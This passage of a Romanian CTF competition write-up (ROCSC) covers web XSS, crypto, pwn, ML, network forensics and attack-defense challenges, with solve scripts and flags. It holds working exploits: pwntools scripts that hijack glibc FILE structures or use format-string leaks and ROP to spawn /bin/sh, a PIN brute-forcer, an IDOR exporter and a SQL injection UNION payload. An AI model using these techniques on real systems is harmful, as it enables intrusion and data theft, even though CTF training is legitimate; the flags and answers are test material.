De ce? Sau cum de am stiut ca trebuie sa fie acolo? 

Doar am aplicat un proces de eliminare
* Stim ca trebuie sa obtinem XSS pentru a obtine flag-ul
* Notele sunt salvate in mod sigur
* Atunci vulnerabilitatea trebuie sa fie in modul in care este afisata nota

Si ce legatura are `.toString('ascii')`? Aici trebuie sa vorbim despre modul in care sunt codificate caractere. Ascii reprezinta codificarea pe 8 biti sau 1 octet. Asta inseamna ca putem avea maxim 2^8 = 256 de caractere diferite. 

Daca ne gandim la cate caractere in alte limbi exista, emoji-uri si asa mai departe, este clar ca acest mod nu poate fi folosit pentru a reprezenta exact acest tip de continut.

Dar, atunci cand salvam o nota, noi nu o salvam in codificarea ASCII. Daca ne uitam in documentatia node, putem gasi aceasta fraza:
```
Node's default encoding for strings is UTF-8
```

[Wikipedia explica destul de bine codificarea UTF-8](https://en.wikipedia.org/wiki/UTF-8), dar pe scurt, aceasta codificare ne ajuta sa reprezentam mult mai multe caractere.

De exemplu, emoji-ul 🚩 este reprezentat in UTF-8 prin secventa de octeti `f0 9f 9a a9`. Cum arata totusi aceasta secventa daca o trecem prin functiile `Buffer.from('🚩').toString('ascii')`?

Ei bine, arata asa: `p\x1F\x1A)`, unde putem observa caracterele printabile 'p' si ')', '\x1F' so '\x1A' fiind caractere neprintabile, conform ![](https://media.geeksforgeeks.org/wp-content/uploads/20240304094301/ASCII-Table.png)

Un lucru important de stiut este ca DOMPurify opereaza pe string-uri UTF-8. Deci chiar daca poate depista un XSS in UTF-8, acest lucru nu este valabil si pentru o conversie UTF-8 -> sanitizare -> ascii. Deoarece DOMPurify are grija sa nu strice caracterele UTF-8 valide, pana la urma cum ar fi daca am avea 🚩 intr-o nota pe bune, si nu am putea vedea emoji-ul dupa ce salvam? :)




Raportam note-ul catre admin, si primim flag-ul pe requestrepo:

**CTF{1edcb4125573c79a8b1b651c47be24e62da2421ba6c357be90b321857412174c}**

<a name="solve-this"></a>
## solve-this (267 pts, 13 solves) - Cryptography

Enunt:
```
Poți te rog să rezolvi acest exercițiu pentru mine?

Flag format: flag{sha256}
```

Aceasta este problema:

```py
n = 3542351939701992275231003142553
a = 126512569275071152686821540801
b = 3415839370426921122544181601752

x = 1  # Find x
# P = (2631211060304008450389410782950: 1597897356677072100955051755088: 1)
# Q = (1249902752727911034264929949680: 3043929197938243211289309561776: 1)
```

Mai este cunoscuta si ca problema logaritmului discret. Doar ca avem de-a face cu curbe eliptice. Conform Wikipedia: O curbă eliptică este definită peste un corp K și descrie punctele din K^2, produsul cartezian al lui K cu el însuși.

Putem folosi SageMath pentru a rezolva problema pentru noi:

```py
n = 3542351939701992275231003142553
a = 126512569275071152686821540801
b = 3415839370426921122544181601752
F = GF(n)
E = EllipticCurve(F, [0, 0, 0, a, b])

# Define the points P and Q
P = E(2631211060304008450389410782950, 1597897356677072100955051755088)
Q = E(1249902752727911034264929949680, 3043929197938243211289309561776)

# Calculate the discrete logarithm
x = P.discrete_log(Q)

# Print the result
print(x)
```

Si gasim ca `x=588581747331`. 

**flag{b2a3253556aeb3bb0f1782c083e90b6de968688d3f435863b82597e6f5efe4c0}**

<a name="spanzuratoarea"></a>
## spanzuratoarea (467 pts, 1 solve) - Pwn

Enunt:
```
Ai învățat până acum cum să joci Spânzurătoarea?
```

Script de rezolvare:
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./spanzuratoarea_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe

context.terminal = ["tmux", "splitw", "-h"]


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("34.107.107.240", 30151)

    return r


def main():
    r = conn()

    # gdb.attach(r, gdbscript="""
    # break *0x4015BE
    # continue
    # """)

    # Initialize a FileStructure object
    fake_stdout = FileStructure()

    # Set up the fake stdout to include the leak to stderr
    fake_stdout.flags = 0x2  # Set flags to writable
    fake_stdout._IO_write_ptr = 1  # Write pointer position
    fake_stdout._IO_write_base = 0  # Write base position
    fake_stdout._IO_buf_base = 0  # Buffer base
    fake_stdout._IO_buf_end = 0  # Buffer end
    fake_stdout.fileno = 1  # File descriptor

    libc_addr = 0x403F98

    fake_chunk = flat(
        0xfbad0800, 0,
        libc_addr, 0,
        libc_addr, libc_addr + 0x8,
        0, 0,
        0, 0,
        0, 0,
        0, 0,
        1,
    )

    r.sendlineafter(b'M-am saturat', b'1')
    r.sendlineafter(b'cuvant', b'-5')
    r.sendafter(b'ghici > ', fake_chunk)

    libc_leak = u64(r.recv(8))
    libc_base = libc_leak - libc.sym['puts']

    libc.address = libc_base
    log.info(f"libc base: {hex(libc_base)}")

    #stdout_lock = libc.address + 0x2008f0   # _IO_stdfile_1_lock  (symbol not exported)
    stdout_lock = libc.sym['_IO_stdfile_1_lock']
    stdout = libc.sym['_IO_2_1_stdout_']
    fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
    # our gadget
    #gadget = libc.address + 0x00000000001676a0 # add rdi, 0x10 ; jmp rcx
    gadget = next(libc.search(asm('add rdi, 0x10 ; jmp rcx')))

    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101
    fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
    fake._IO_save_base = gadget
    fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
    fake._lock=stdout_lock
    fake._codecvt= stdout + 0xb8
    fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
    fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

    import time


    time.sleep(0.5)
    #r.sendlineafter(b'M-am saturat', b'1')
    r.sendline(b'1')
    time.sleep(0.1)
    r.sendline(b'-5')
    time.sleep(0.1)
    r.send(bytes(fake))

    r.interactive()


if __name__ == "__main__":
    main()
```

**Ctf{r3arr4ng3_th3_f1l35_unt1l_y0u_contr0l_th3_n4rr4t1v3}**

<a name="zero-shot"></a>
## zero-shot (50 pts, 34 solves) - ML/AI

Enunt:
```
Sunt foarte curios cum Inteligența Artificială o să ne transforme viața în viitorul apropiat. 

Dacă ești interesat să îți povestesc mai multe, obține secretul din fișierele primite și îți voi zice tot ce vrei să știi.

Target: http://142.93.100.92:19417/
```

O solutie prin care optimizam procentul de `leet` intr-un mod greedy (la fiecare iteratie, luam caracterul care ne-a dat cel mai bun scor:`

```py
import requests

flag = list('LL3EE3E3E3L3eEE33ee3lett')

for i in range(2, 20):
  sc = 0
  b = None
  for c in "lL3eE":
    while True:
      try:
        burp0_url = "http://142.93.100.92:19417/api/v1/predict"
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://142.93.100.92:19417", "Referer": "http://142.93.100.92:19417/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"}

        flag[i] = c
        s = "".join(flag)

        burp0_json={"prompt": s}

        data = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies={'http':'http://127.0.0.1:8080/'}).json()
        score = data["aggregate"]["totalScores"]["l33t"]
        if data["aggregate"]["totalScores"]["l33t"] > data["aggregate"]["totalScores"]["sad"]:
          print("found", "".join(flag), data["flag"])
        if score > sc:
          b = c
          sc = score
        break
      except (ConnectionError, requests.exceptions.JSONDecodeError):
        continue

  flag[i] = b
  print(''.join(flag), sc)
```

**FLAG{4ae71f2c915017fd4c00b7374419c6ce9a29f03f72183b2919cd2032ba4d6aa2}**

<a name="jeopardy-rocsc"></a>
# Jeopardy ROCSC

Niste probleme putin mai grele date doar concurentilor care au participat la ROCSC.

<a name="keylogger"></a>
## keylogger (433 pts, 7 solves) - Network

Enunt:
```
Analizează fișierul primit și obține secretul.

Flag format: CTF{sha256}
```

Problema a fost foarte similara cu aceasta: [https://klanec.github.io/rgbctf/2020/07/19/rgbctf-PI-1.html](https://klanec.github.io/rgbctf/2020/07/19/rgbctf-PI-1.html)

Script de rezolvare:
```py
from json import load, dump
import json


with open("hci.json", "r") as f:
    t = load(f)

def get_key_btatt_value(cap):
    """ Data in flight captured through btmon of a HID like a keyboard will use the btatt protocol's value field to transmit

    This functions gets only the btatt.value field as a list in order of packet time
    """
    l = []
    for x in cap:
        try:
            btatt_value = x['_source']['layers']['btatt'].get('btatt.value')
            if btatt_value:
                l.append(btatt_value)
        except (AttributeError, KeyError):
            pass
    return l

def is_key_press(p):
    """ Bluetooth keyboards will not only communicate OnKeyPress
    but also onKeyReleased. We need to filter that out.
    """
    if len(p) == 20:
      data = p.split(':')
      is_keyval = int(data[1], 16) != 0
      has_timestamp = int(data[2], 16) != 0 #I think this data value is a timestamp or velocity value?
      return is_keyval and not has_timestamp
    else:
      return False


def get_key_value(l):
    out = ''

    #alphabet
    translator = {i:chr(i+93) for i in range(4,30)}

    #symbols
    translator[42] = "<BKSP>"
    translator[44] = " "
    translator[40] = "\n"
    translator[56] = "?"
    translator[46] = "+"
    translator[52] = "'"
    translator[54] = ","

    #numbers
    translator[39] = "0"
    numbers = {i+29:str(i) for i in range(1,10)}
    translator.update(numbers)

    for x in get_key_btatt_value(l):
        if is_key_press(x):
            data = x.split(':')
            i = int(data[1], 16)
            c = translator.get(i, "<?_{}_?>".format(i))

            # Check SHIFT key down in the first byte
            if data[0] == "20":
                c = "<SHFT_{}>".format(c)

            out += c

    return out

cap = json.load(open("hci.json", "r"))

print(get_key_btatt_value(cap))
print(get_key_value(cap))
```

**ctf{d173aa2d229f7f5a4277ef306f0d339a92871c34afc6cced5afce7610266556d}**

<a name="magic"></a>
## magic (467 pts, 3 solves) - Pwn

Enunt:
```
Se dă un binar scris în limbajul de programare C. 

Să se identifice vulnerabilitatea prezentă în binar și să se obțină flag-ul.

Identificați valoarea "magică" ca să puteți obține manipularea executiei codului.

Flag format: CTF{sha256}
```

Script de rezolvare:

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./magic_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

context.terminal = ["tmux", "splitw", "-h"]


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("35.246.128.32", 31485)

    return r


def main():
    r = conn()

    r.sendlineafter(b'Enter your choice: ', b'1')

    # gdb.attach(r, gdbscript="""
    # break *0x0000555555400E4A
    # continue"""
    # )

    r.sendlineafter(b'Size:', b'2')
    r.sendlineafter(b'Enter the message to write to syslog: ', b'%p '* 10 + b' %75$p %80$p')

    d = b''
    while b'0x' not in d:
      d = r.recvline()

    d = d.split(b' ')

    libc_leak = int(d[-1],16)
    stack_leak = int(d[-2], 16)
    heap_leak = int(d[-6], 16)

    libc.address = libc_leak - libc.sym.__libc_start_main - 0xe7
    log.info(f'Libc base: {hex(libc.address)}')
    log.info(f'Stack leak: {hex(stack_leak)}')
    log.info(f'Heap leak: {hex(heap_leak)}')

    stack_target = stack_leak - 24

    to_add = (stack_target - heap_leak) // 8

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

    bin_sh = next(libc.search(b'/bin/sh\x00'))

    r.sendlineafter(b'Offset & Value', f'{hex((stack_leak - heap_leak) // 8)} {hex(libc.sym["system"])}'.encode())
    r.sendlineafter(b'Offset & Value', f'{hex((stack_leak - heap_leak - 8) // 8)} {hex(bin_sh)}'.encode())

    ret = rop.find_gadget(['ret'])[0]

    r.sendlineafter(b'Enter your choice: ', b'1')

    # gdb.attach(r, gdbscript="""
    # break *0x0000555555400E4A
    # continue"""
    # )

    r.sendlineafter(b'Size:', b'2')
    r.sendlineafter(b'Enter the message to write to syslog: ', b'%p '* 10 + b' %75$p %80$p')

    d = b''
    while b'0x' not in d:
      d = r.recvline()

    d = b''
    while b'0x' not in d:
      d = r.recvline()

    d = d.split(b' ')

    #libc_leak = int(d[-1],16)
    #stack_leak = int(d[-2], 16)
    heap_leak = int(d[-6], 16)

    log.info(f'Libc base: {hex(libc.address)}')
    log.info(f'Stack leak: {hex(stack_leak)}')
    log.info(f'Heap leak: {hex(heap_leak)}')

    r.sendlineafter(b'Offset & Value', f'{hex((stack_leak - heap_leak - 16) // 8)} {hex(pop_rdi)}'.encode())
    r.sendlineafter(b'Offset & Value', f'{hex((stack_leak - heap_leak - 24) // 8)} {hex(ret)}'.encode())

    r.interactive()


if __name__ == "__main__":
    main()
```

**CTF{9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08}**

<a name="decrypt-this"></a>
## decrypt-this (483 pts, 1 solve) - Cryptography

Enunt:
```
Tocmai ce ai primit câteva date encriptate și cheile necesare pentru a le decripta. Știind că mecanismul folosit este RSA-PKCS, iar PIN-ul are doar 5 cifre, cum ai putea decripta datele primite?

Flag format: CTF{sha256}
```

Primim continutul unui `token digital`, folosit pentru semnaturi electronice. 
```py
import os
import subprocess

# Constants
softhsm_lib_path = '/usr/lib/softhsm/libsofthsm2.so'
token_label = 'Default'
data_file = 'data.bin'

# Function to brute-force the PIN
def brute_force_pin():
    for pin in range(100000):
        pin_str = f"{pin:05d}"
        print(f"Trying PIN: {pin_str}")

        try:
            # Attempt to login with the current PIN using p11tool
            os.popen('cp /home/adragos/softhsm2/orig/80837632-90de-859e-38fc-a89393b35f19/token.object /home/adragos/softhsm2/80837632-90de-859e-38fc-a89393b35f19/token.object').read()
            result = subprocess.run(
                ['pkcs11-tool', '--module', '/usr/lib/x86_64-linux-gnu/softhsm/libsofthsm2.so', '-l', '-t', '-p', pin_str],
                capture_output=True, text=True, check=True
            )

            # If successful, return the PIN
            print(f"Successfully authenticated with PIN: {pin_str}")
            return pin_str
        except subprocess.CalledProcessError:
            # If the command fails, it means the PIN is incorrect
            continue

    return None

# Brute-force the PIN
found_pin = brute_force_pin()

if not found_pin:
    print("Failed to find the correct PIN")
    exit(1)

print(found_pin)(base)
```

Si aflam PIN-ul 12345. Il putem folosi pentru a decripta continutul fisierului si a obtine flag-ul:

**CTF{4E669FC71463B0C0C13488E4B8627267399E581C4A2AD2D19FFEC44A65AAB8B0}**

<a name="attack-defense"></a>
# Attack & Defense

În esență, un concurs Attack & Defense implică mai multe echipe care concurează simultan, fiecare primind acces la aceleași servicii vulnerabile, găzduite pe mașini virtuale numite "vulnbox". In cazul RoCSC / Olimpiada de Securitate Cibernetica, echipele sunt formate dintr-un singur participant.


Obiectivul este dublu: să menții propriile servicii funcționale și să exploatezi vulnerabilitățile din sistemele adversarilor. Punctele se acumulează atât pentru apărare, cât și pentru atac reușit.

În paralel, sistemul automat de verificare, numit "checker", monitorizează constant starea serviciilor fiecărei echipe. Verifică dacă serviciile funcționează corect și dacă vulnerabilitățile au fost remediate corespunzător. Înțelegerea modului în care funcționează acest checker este vitală pentru menținerea unui SLA ridicat.

Un element cheie al acestor competiții este conceptul de SLA (Service Level Agreement). SLA reprezintă procentul de timp în care serviciul tău a trecut de testele checkerului automat. Este crucial să înțelegi că SLA-ul tău afectează direct scorul total. De exemplu, un SLA de 50% înseamnă că vei obține doar jumătate din punctajul potențial.

În ceea ce privește punctarea, este important de menționat că nu primești puncte pentru apărare (defense). În schimb, poți doar pierde puncte dacă alți competitori reușesc să îți fure flag-urile. Punctele se acumulează exclusiv pentru atacurile reușite asupra serviciilor altor echipe.

Un alt element esențial este gateway-ul central. Acesta rescrie traficul de rețea între echipe, asigurând anonimitatea atacurilor. Practic, nu poți ști cine te atacă, ceea ce adaugă un nivel suplimentar de complexitate scenariului. Trebuie să fii pregătit să te aperi împotriva oricui, în orice moment.

Pentru a avea succes în aceste competiții, echipele folosesc o varietate de instrumente. Câteva exemple includ:

* [Tulip](https://github.com/OpenAttackDefenseTools/tulip) - pentru a monitoriza traficul
* [DestructiveFarm](https://github.com/DestructiveVoice/DestructiveFarm) - pentru a ataca toate echipele simultan

<a name="eeeinvoice"></a>
## eeeinvoice - A/D

Un exemplu de atac folosit:

```py
#!/Users/adragos/miniconda3/bin/python

import random
import sys
import json

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <target_ip/team_id> [flagstore json]")
    sys.exit(1)

ip, team_id = sys.argv[1].split('/') if '/' in sys.argv[1] else (sys.argv[1], None)
flagstore = json.loads(open(sys.argv[2],"r").read() if len(sys.argv) > 2 else "[]")

ip = ip + "2"

import requests

url = "http://"+ip+":8000/"

import random
import string

s = requests.Session()

r = s.get(url + "register")
csrf_token = r.text.split('_token" value="')[1].split('"')[0]

print(csrf_token)

username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
email = username + "@bitsentinel.ro"

data = {
  "_token": csrf_token,
  "name": username,
  "password": password,
  "email": email,
  "password_confirmation": password
}

r = s.post(url + "register", data=data)

data = {
  "_token": csrf_token,
  "recipient": username,
  "amount": random.randint(1, 1000),
  "description": "7vwp6i6vglw0kqy_2654 Here I might add a flag ..."
}

r = s.post(url + "invoice/create", data=data)

last_id = int(s.get(url + "dashboard").text.split('<td class="py-4 px-6">')[1].split('</td>')[0])

for id in range(last_id, last_id - 20, -1):
  r = s.get(url + f"invoice/export/{id}")
  print(r.text, flush=True)
```

<a name="lazypeoninn"></a>
## lazypeoninn - A/D

Un exemplu de atac folosit:

```py
#!/Users/adragos/miniconda3/bin/python

import random
import sys
import json

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <target_ip/team_id> [flagstore json]")
    sys.exit(1)

ip, team_id = sys.argv[1].split('/') if '/' in sys.argv[1] else (sys.argv[1], None)
flagstore = json.loads(open(sys.argv[2],"r").read() if len(sys.argv) > 2 else "[]")

ip = ip + "3"

import requests


url = "http://"+ip+":5000/review/read?code=%27%20UNION%20SELECT%20ingredients,%201,%201%20FROM%20dish;--%20-"

r = requests.get(url)
print(r.text, flush=True)
```